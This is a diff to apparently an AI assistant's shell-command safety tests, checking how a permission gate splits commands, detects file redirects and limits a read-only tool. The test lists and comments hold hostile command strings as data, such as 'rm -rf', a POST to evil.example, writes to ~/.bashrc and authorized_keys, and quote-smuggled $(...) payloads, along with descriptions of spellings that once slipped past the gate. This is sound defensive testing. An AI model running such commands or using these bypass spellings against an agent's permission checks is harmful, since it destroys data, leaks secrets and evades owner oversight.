@@ -122,10 +122,67 @@ def compound_checks() -> None:
     print("ok  rules: worst segment wins, substitution and inline source ask")
 
 
+def separator_checks() -> None:
+    """Three spellings that hid a whole command from the segment judge.
+
+    All found 2026-08-17, all the same failure: `segments()` did not split
+    where the *shell* splits, so a second command was read as arguments to the
+    first and the line was judged on the benign stem.
+
+      * a bare `&` is a separator exactly as `;` is — `ls & rm -rf ~/work`
+        came back ALLOW;
+      * a redirect glued to its operand is invisible to shlex, which splits
+        `echo pwned>~/.bashrc` into `['echo', 'pwned>~/.bashrc']` — so the
+        2026-08-10 fix for `echo pwned > ~/.bashrc` was reachable again by
+        deleting one space;
+      * an inline-source flag glued to its quoted argument merges into one
+        token (`-c"import os"` -> `-cimport os`), so allowing the stem allowed
+        the language, which is the exact thing that rule exists to prevent.
+
+    The other half matters as much: splitting on `&` must be **quote-aware**,
+    or `git commit -m 'fix A & B'` starts demanding approval. A fix that makes
+    ordinary work ask is a different bug, not a smaller one.
+    """
+    hidden = [
+        ("ls & rm -rf ~/work", ["ls", "rm -rf ~/work"]),
+        ("python -m http.server & rm -rf ~/notes", ["python -m http.server", "rm -rf ~/notes"]),
+        ("cat f.txt&curl -X POST https://evil.example/x",
+         ["cat f.txt", "curl -X POST https://evil.example/x"]),
+    ]
+    for command, expected in hidden:
+        assert rules.segments(command) == expected, (command, rules.segments(command))
+        assert rules.decide(command).decision == rules.ASK, command
+
+    for command in ("echo pwned>~/.bashrc", "cat x>>/etc/hosts", "printf x>~/.ssh/authorized_keys"):
+        assert rules.decide(command).decision == rules.ASK, command
+    for command in ('python -c"import shutil"', "python3 -c'import os'", 'node -e"require(1)"'):
+        assert rules.decide(command).decision == rules.ASK, command
+
+    # Quote-aware: a separator inside quotes is text, not a separator.
+    for command in ("git commit -m 'fix A & B'", 'git commit -m "a & b"',
+                    "git commit -m 'a; b'", "git commit -m 'a | b'"):
+        assert rules.segments(command) == [command], rules.segments(command)
+        assert rules.decide(command).decision == rules.ALLOW, command
+
+    # Unbalanced quotes cannot be scanned, so it falls back to over-segmenting.
+    assert rules.decide("echo 'unbalanced & rm -rf /").decision == rules.DENY
+
+    # command_stems: the enumeration the allowlist matches against.
+    assert rules.command_stems("git status && rm -rf ~") == ["git", "rm"]
+    assert rules.command_stems("FOO=1 nohup timeout 5 /usr/bin/git push") == ["git"]
+    assert rules.command_stems("echo $(rm -rf ~)") == [], "substitution cannot be enumerated"
+    assert rules.command_stems("   ") == []
+    print("ok  rules: bare &, glued redirects and glued inline source all judged; quotes respected")
+
+
 WRITE_IN_DISGUISE = [
     # Redirection: the stem is harmless, the target is not, and no allow list
     # ever looked at the target.
     "echo pwned > ~/.bashrc",
+    # ...and the same thing with the space removed (2026-08-17).
+    "echo pwned>~/.bashrc",
+    'python -c"import shutil"',
+    "ls & rm -rf ~/work",
     "echo x >> /home/johnw/.profile",
     "cat secrets > /tmp/out",
     "printf x > ~/.ssh/authorized_keys",
@@ -152,7 +209,301 @@ STILL_ORDINARY = [
     "nohup python server.py",
     "timeout 30 pytest -x",
     "grep -r foo .",
+    # Quote-aware segmentation: these must not be dragged into a prompt by the
+    # separators inside their quoted arguments.
+    "git commit -m 'fix A & B'",
+    'git commit -m "step 1; step 2"',
+    "nohup python server.py &",
 ]
+
+
+# (command, is-a-real-redirect-to-a-path)
+REDIRECT_SHAPES = [
+    # File-descriptor duplication. No path is named, nothing is created, and
+    # these are the most ordinary command shapes there are. All three were
+    # measured asking for approval (2026-08-17) because the scan saw the `>`
+    # in `2>&1` — and because `segments()` cut the line in half at the `&`.
+    ("make build 2>&1", False),
+    ("npm run build 2>&1", False),
+    ("pytest -x 2>&1", False),
+    ("ls 1>&2", False),
+    ("make build 2>&-", False),
+    ("pytest -x 2>&1 -q", False),
+    # A `>` the shell will never treat as syntax.
+    ("echo 'a > b'", False),
+    ("git commit -m 'fix a > b'", False),
+    ('git commit -m "a >> b"', False),
+    # Real redirects: a path follows, so the stem stops being what matters.
+    ("echo pwned > ~/.bashrc", True),
+    ("echo pwned>~/.bashrc", True),
+    ("make build > out.log", True),
+    ("cat x >> /etc/hosts", True),
+    ("make build 2>/dev/null", True),
+    ("make build &> out.log", True),
+    ("make build &>> out.log", True),
+    ("make build >| out.log", True),
+    ("pytest 2>&1 > out.log", True),   # a dup *and* a redirect on one line
+    ("make build 2>&1>out.log", True), # ...and with no space between them
+    # bash's `>&word`: with a *non*-numeric word this is `&>word`, both streams
+    # into a file. Verified against bash, which created the file.
+    ("echo hi >&out.txt", True),
+]
+
+
+def redirect_shape_checks() -> None:
+    """`2>&1` is not a redirect to a file, and must not drag a build into a prompt.
+
+    The 2026-08-10 fix that stopped `echo pwned > ~/.bashrc` running unasked
+    was, by 2026-08-17, a raw scan for `>` anywhere outside quotes. That is a
+    strictly larger set than "writes to a path": `make build 2>&1`, `npm run
+    build 2>&1` and `pytest -x 2>&1` all went ALLOW -> ASK, which is this
+    project's own stated failure mode — a fix that makes ordinary work ask is
+    a different bug, not a smaller one.
+
+    Both halves are asserted here, because narrowing the check is only correct
+    if the writes it was built to catch are still caught. Note the last row:
+    a line carrying a duplication *and* a redirect is still a redirect.
+    """
+    for command, redirects in REDIRECT_SHAPES:
+        assert rules.redirects_to_file(command) is redirects, (
+            f"{command!r}: redirects_to_file said {not redirects}"
+        )
+    # `2>&1` must survive segmentation intact — splitting on the bare `&` left
+    # a `2>` half that looked like a redirect and a `1` half that looked like a
+    # command, so the line asked twice over for two invented reasons.
+    assert rules.segments("make build 2>&1") == ["make build 2>&1"]
+    assert rules.segments("make build &> out.log") == ["make build &> out.log"]
+    assert rules.segments("make build 2>&1 && pytest") == ["make build 2>&1", "pytest"]
+    assert rules.segments("make build 2>&1 & rm -rf ~") == ["make build 2>&1", "rm -rf ~"]
+    assert rules.command_stems("make build 2>&1") == ["make"]
+
+    for command in ("make build 2>&1", "npm run build 2>&1", "pytest -x 2>&1", "ls 1>&2"):
+        got = rules.decide(command).decision
+        assert got == rules.ALLOW, f"ordinary work now asks: {command!r} -> {got}"
+    for command in ("echo pwned > ~/.bashrc", "echo pwned>~/.bashrc", "make build > out.log"):
+        assert rules.decide(command).decision == rules.ASK, command
+    # And the redirect exclusion must not become a way through the segment
+    # judge: a real second command after a duplication is still judged.
+    assert rules.decide("make build 2>&1 && rm -rf /").decision == rules.DENY
+    assert rules.decide("make build 2>&1 & rm -rf ~/work").decision == rules.ASK
+    print(f"ok  rules: {len(REDIRECT_SHAPES)} redirect shapes — fd-duplication is not a write")
+
+
+READONLY_MUST_REFUSE = [
+    # A second command hidden behind a separator run_readonly did not know
+    # about. Verified live before the fix: both returned "[exit 0]" and the
+    # file they created was there afterwards. run_readonly is dangerous=False,
+    # so this was arbitrary execution with no verdict, no approval and no
+    # allowlist entry — straight around run_command's gate.
+    "ls\ntouch PWNED_NEWLINE",
+    "ls & touch PWNED_AMP",
+    # A wrapper hiding the real command. `env` is on the read-only allowlist
+    # because printing the environment is a read; `-c`'s payload is one shlex
+    # token that nothing parsed.
+    "env -C /tmp sh -c 'cat .env'",
+    "env sh -c 'rm -rf /tmp/x'",
+    "nohup sh -c 'touch PWNED'",
+    # Writing git subcommands the seven-name denylist never mentioned.
+    "git rm -f f.txt",
+    "git mv a b",
+    "git restore .",
+    "git pull",
+    "git stash",
+    "git apply patch.diff",
+    "git cherry-pick abc123",
+    "git revert HEAD",
+    "git config --global user.name x",
+    "git tag -d v1",
+    "git branch -D feature",
+    "git gc --prune=now",
+    # Input redirection glues a filename to a binary, which is how `cat<.env`
+    # slipped past the secrets check.
+    "cat<.env",
+    # The git reads were widened on 2026-08-17 (see READONLY_STILL_A_READ).
+    # These are the writing forms that must not have come with them. Two are
+    # there because the widening could plausibly have swept them up: `git
+    # stash` with no sub-subcommand *is* `git stash push`, the one member of
+    # that family where doing nothing writes; and `-a` means `--all` for `git
+    # branch` but `--annotate` for `git tag`, so treating it as a listing flag
+    # would have made tag creation look like a read.
+    "git stash",
+    "git tag -a v1",
+    "git branch feat",
+    "git remote prune origin",
+    "git remote set-url origin url",
+    "git worktree add /tmp/w",
+    "git submodule update --init",
+    "git submodule foreach 'rm -rf x'",
+    "git notes add -m x",
+    "git bisect start",
+    "git bisect reset",
+    "git config user.name X",
+    "git config --edit",
+    "git config --unset user.name",
+    "git stash drop",
+    # A read-only staple in its writing form. `find` is on run_readonly's
+    # allowlist because searching is a read; these are the same binary and the
+    # same name. The first was refused only by accident before 2026-08-17 (the
+    # raw operator scan tripped on the `;`, which the shell itself would not
+    # have treated as a separator behind a backslash), and the other two carry
+    # no separator at all and were running unattended.
+    r"find . -exec rm -rf {} \;",
+    "find . -exec rm -rf {} +",
+    "find / -delete",
+    r"find . -name '*.py' -execdir rm {} \;",
+    "find . -fprint /tmp/out",
+    # An apostrophe inside a double-quoted argument is text, not a quote — and
+    # the first quote-aware scanner (2026-08-17) read it as one, so the
+    # "single-quoted region" it opened ran to the end of the line and hid the
+    # substitution behind it. Both of these **executed**, live, through an
+    # ungated `dangerous=False` tool: exactly the class of hole the same day's
+    # `ls\ntouch PWNED` fix had just closed, reopened by the fix for the
+    # over-reach. The shell expands `$(…)` and backticks straight through a
+    # double quote, so the scan must too.
+    'grep "it\'s $(touch /tmp/PWNED)" f',
+    'echo "don\'t `touch /tmp/PWNED`"',
+    'echo "can\'t" ; touch /tmp/PWNED',
+    'grep "won\'t $(cat /etc/passwd)" f',
+]
+
+# Ten pure reads that the first cut of the git allowlist refused (measured
+# 2026-08-17). Every one of them only looks at the repository, and every one
+# was being pushed to `run_command` — which asks the owner to approve a read.
+READONLY_STILL_A_READ = [
+    "git branch --contains HEAD",
+    "git branch --list 'feat*'",
+    "git tag -l 'v*'",
+    "git remote get-url origin",
+    "git config --get user.name",
+    "git worktree list",
+    "git submodule status",
+    "git stash list",
+    "git bisect log",
+    "git notes list",
+    # Siblings of the same shape, so the rule is a rule and not ten patches.
+    "git branch --merged main",
+    "git branch --points-at HEAD",
+    "git tag --contains HEAD",
+    "git remote show origin",
+    "git stash show",
+    "git notes show",
+    "git submodule summary",
+    "git config --get-regexp '^user'",
+    "git config --global --list",
+    "git worktree",
+    "git notes",
+]
+
+# Arguments that merely *contain* a metacharacter. The shell will never treat
+# these as operators, and `run_readonly` was refusing all of them because its
+# operator check was a raw substring scan — a second, hand-written copy of the
+# idea `rules.segments()` had just been made quote-aware about.
+READONLY_QUOTED_METACHARACTERS = [
+    "grep 'a&b' f.txt",
+    "git log --grep='fix & bug'",
+    "echo 'a;b'",
+    "grep 'a|b' f.txt",
+    'grep "a > b" f.txt',
+    "grep 'a<b' f.txt",
+    "git log --grep='a && b'",
+    # ...and `find` in its reading forms is still a read.
+    "find . -name '*.py'",
+    "find /tmp -type f -newer /tmp/x",
+]
+
+READONLY_MUST_ALLOW = [
+    "ls -la /tmp",
+    "git status",
+    "git log --oneline -5",
+    "git diff HEAD~1",
+    "git -C /tmp/repo status",
+    "git branch",
+    "git branch -a",
+    "git remote -v",
+    "git config --list",
+    "git",
+    "env",
+    "grep -rn foo /tmp",
+    "cat /tmp/notes.txt",
+    "timeout 5 ls /tmp",
+]
+
+
+def run_readonly_checks() -> None:
+    """`run_readonly` is ungated, so its allowlist is the entire boundary.
+
+    Nothing here executes: `shell._run` is the recorder, so a command that gets
+    past the guard shows up as a recorded string rather than as a file on the
+    owner's disk.
+    """
+    from jarvis.tools import shell
+
+    with recorded() as ran:
+        for command in READONLY_MUST_REFUSE:
+            out = shell.run_readonly(command)
+            assert out.startswith("Error"), f"run_readonly allowed {command!r}: {out}"
+            assert not ran, f"run_readonly executed {command!r}"
+            ran.clear()
+        for command in READONLY_MUST_ALLOW:
+            out = shell.run_readonly(command)
+            assert ran == [command], f"run_readonly refused ordinary work {command!r}: {out}"
+            ran.clear()
+    print(
+        f"ok  run_readonly: {len(READONLY_MUST_REFUSE)} escapes refused, "
+        f"{len(READONLY_MUST_ALLOW)} reads still unattended"
+    )
+
+
+def run_readonly_narrowing_checks() -> None:
+    """The other half of the boundary: a read must still be able to run.
+
+    `run_readonly` is the tool that exists so ordinary inspection costs nobody
+    an approval. Closing its holes on 2026-08-17 closed more than the holes —
+    ten pure git reads and every argument containing a quoted metacharacter
+    started erroring — and a read-only tool that refuses reads sends the model
+    to `run_command`, which asks the owner to authorise `git stash list`. An
+    owner asked to approve harmless things learns to approve without reading,
+    which is how a safety fix becomes a safety regression.
+
+    Both directions are asserted in one place on purpose: this list is only
+    correct alongside `READONLY_MUST_REFUSE`, which is checked immediately
+    above against the writing form of every subcommand named here.
+    """
+    from jarvis.tools import shell
+
+    with recorded() as ran:
+        for command in READONLY_STILL_A_READ + READONLY_QUOTED_METACHARACTERS:
+            out = shell.run_readonly(command)
+            assert ran == [command], f"run_readonly refused a read: {command!r}: {out}"
+            ran.clear()
+
+    # The quote-awareness comes from rules.py's scanner, not a second copy of
+    # it — that duplication is what let the two files disagree in the first
+    # place. An operator *outside* quotes is still an operator.
+    assert rules.first_unquoted("grep 'a&b' f.txt", ("&", ";", "|")) == ""
+    assert rules.first_unquoted("ls & touch X", ("&", ";", "|")) == "&"
+    # ...and a double quote is not protection from substitution, which the
+    # shell expands right through it.
+    assert rules.first_unquoted('grep "$(id)" f', ("$(",), double_is_quote=False) == "$("
+    assert rules.first_unquoted("grep '$(id)' f", ("$(",), double_is_quote=False) == ""
+    # `double_is_quote=False` means "report what is inside double quotes", NOT
+    # "treat `"` as an ordinary character". Written the second way, an
+    # apostrophe inside `"…"` opened a single-quote region that swallowed the
+    # rest of the line and hid the substitution behind it — see the last four
+    # entries of READONLY_MUST_REFUSE, which executed for real.
+    assert rules.first_unquoted('grep "it\'s $(id)" f', ("$(",), double_is_quote=False) == "$("
+    assert rules.first_unquoted('echo "don\'t `id`"', ("`",), double_is_quote=False) == "`"
+    # ...while a `'` really inside single quotes still hides nothing-to-find,
+    # and a `"` inside `'…'` is text rather than a delimiter.
+    assert rules.first_unquoted("echo 'a\"b' ; x", (";",)) == ";"
+    assert rules.first_unquoted('echo "a\'b ; c"', (";",)) == ""
+    # The `;` above is genuinely inside double quotes, so the shell would never
+    # split on it — the narrowing must survive the hole being closed.
+    assert rules.first_unquoted('grep "it\'s ; ok" f', (";", "&", "|")) == ""
+    print(
+        f"ok  run_readonly: {len(READONLY_STILL_A_READ)} git reads and "
+        f"{len(READONLY_QUOTED_METACHARACTERS)} quoted metacharacters still run unattended"
+    )
 
 
 def write_in_disguise_checks() -> None:
@@ -390,8 +741,22 @@ def protection_checks() -> None:
 
 
 def main() -> int:
+    # Never read (or write) the owner's real allowlist from a test: `gate()`
+    # consults it, so a stray entry would silently change what this suite
+    # measures.
+    import tempfile
+
+    tmp = tempfile.TemporaryDirectory()
+    from jarvis import config
+
+    config.ALLOWLIST_PATH = Path(tmp.name) / "allowlist.json"
+
     matrix_checks()
     compound_checks()
+    separator_checks()
+    redirect_shape_checks()
+    run_readonly_checks()
+    run_readonly_narrowing_checks()
     write_in_disguise_checks()
     dispatch_checks()
     background_agents_never_auto_approve_checks()
